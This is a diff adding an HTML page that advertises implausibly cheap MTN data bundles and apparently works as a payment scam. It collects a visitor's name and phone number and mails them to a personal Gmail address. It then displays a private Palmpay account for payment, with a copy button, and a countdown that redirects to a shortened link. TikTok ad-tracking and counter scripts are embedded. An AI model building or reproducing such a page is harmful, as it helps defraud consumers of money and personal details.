@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+  ttq.load('D5CHCKBC77U9GN88D220');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Buy Cheap MTN Data</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f6f8;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 420px;
+      margin: 40px auto;
+      background: #ffffff;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    }
+    h1 {
+      text-align: center;
+      color: #ffcc00;
+      margin-bottom: 20px;
+    }
+    button {
+      width: 100%;
+      padding: 15px;
+      background: #ffcc00;
+      color: #000;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .step { display: none; }
+    .step.active { display: block; }
+    .option {
+      border: 2px solid #ddd;
+      padding: 12px;
+      border-radius: 6px;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+    .option.selected {
+      border-color: #ffcc00;
+      background: #fff9e6;
+    }
+    input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 15px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+    .bank-box {
+      background: #f1f5f9;
+      padding: 15px;
+      border-radius: 6px;
+      text-align: center;
+    }
+    .copy-btn {
+      margin-top: 10px;
+      background: #333;
+      color: #fff;
+    }
+    .timer {
+      margin-top: 20px;
+      font-size: 18px;
+      font-weight: bold;
+      color: #d9534f;
+      text-align: center;
+    }
+    .error {
+      color: red;
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- STEP 1 -->
+  <div class="step active" id="step1">
+    <h1>BUY CHEAP MTN DATA</h1>
+    <button onclick="goToStep(2)">Buy Now</button>
+  </div>
+
+  <!-- STEP 2 -->
+  <div class="step" id="step2">
+    <h1>Select Data Plan</h1>
+    <div id="planError" class="error"></div>
+
+    <div class="option" onclick="selectPlan(this,'₦1,000 – 10GB')">₦1,000 – 10GB</div>
+    <div class="option" onclick="selectPlan(this,'₦2,000 – 20GB')">₦2,000 – 20GB</div>
+    <div class="option" onclick="selectPlan(this,'₦3,000 – 30GB')">₦3,000 – 30GB</div>
+    <div class="option" onclick="selectPlan(this,'₦4,000 – 40GB')">₦4,000 – 40GB</div>
+    <div class="option" onclick="selectPlan(this,'₦5,000 – 50GB')">₦5,000 – 50GB</div>
+
+    <button onclick="validatePlan()">Next</button>
+  </div>
+
+  <!-- STEP 3 -->
+  <div class="step" id="step3">
+    <h1>Enter Details</h1>
+    <input type="text" id="fullname" placeholder="Enter Your Full Name">
+    <input type="tel" id="phone" placeholder="Enter MTN Phone Number">
+    <button onclick="sendDetails()">Next</button>
+  </div>
+
+  <!-- STEP 4 -->
+  <div class="step" id="step4">
+    <h1>Make Payment</h1>
+
+    <div class="bank-box">
+      <strong>Bank:</strong> Palmpay<br>
+      <strong>Account Name:</strong> Emmanuel James<br>
+      <strong>Account Number:</strong><br>
+      <span id="accountNumber">8038633078</span><br>
+      <button class="copy-btn" onclick="copyAccount()">Copy Account Number</button>
+    </div>
+
+    <div class="timer">
+      Redirecting in <span id="countdown">60</span> seconds...
+    </div>
+  </div>
+
+</div>
+
+<script>
+  let selectedPlan = "";
+  let timeLeft = 60;
+  let timerStarted = false;
+
+  function goToStep(step) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById('step' + step).classList.add('active');
+  }
+
+  function selectPlan(el, plan) {
+    document.querySelectorAll('.option').forEach(o => o.classList.remove('selected'));
+    el.classList.add('selected');
+    selectedPlan = plan;
+    document.getElementById("planError").textContent = "";
+  }
+
+  function validatePlan() {
+    if (!selectedPlan) {
+      document.getElementById("planError").textContent = "Please select a data plan.";
+      return;
+    }
+    goToStep(3);
+  }
+
+  function sendDetails() {
+    const name = document.getElementById("fullname").value.trim();
+    const phone = document.getElementById("phone").value.trim();
+
+    if (name === "" || phone.length < 10) {
+      alert("Please enter your name and a valid phone number.");
+      return;
+    }
+
+    const subject = "MTN Data Purchase Request";
+    const body =
+      "Name: " + name + "%0D%0A" +
+      "Phone Number: " + phone + "%0D%0A" +
+      "Selected Plan: " + selectedPlan;
+
+    window.location.href =
+      "mailto:lfakirireda@gmail.com?subject=" + subject + "&body=" + body;
+
+    goToStep(4);
+    startTimer();
+  }
+
+  function copyAccount() {
+    navigator.clipboard.writeText("8038633078");
+    alert("Account number copied!");
+  }
+
+  function startTimer() {
+    if (timerStarted) return;
+    timerStarted = true;
+
+    const countdownEl = document.getElementById("countdown");
+    const timer = setInterval(() => {
+      timeLeft--;
+      countdownEl.textContent = timeLeft;
+      if (timeLeft <= 0) {
+        clearInterval(timer);
+        window.location.href =
+          "https://t.co/wOQvOHx0Ao";
+      }
+    }, 1000);
+  }
+</script>
+
+</body>
+
+   <!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1725754,"_","ffffff");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
+</center>
+<!-- END: Powered by Supercounters.com -->
+
+</html>
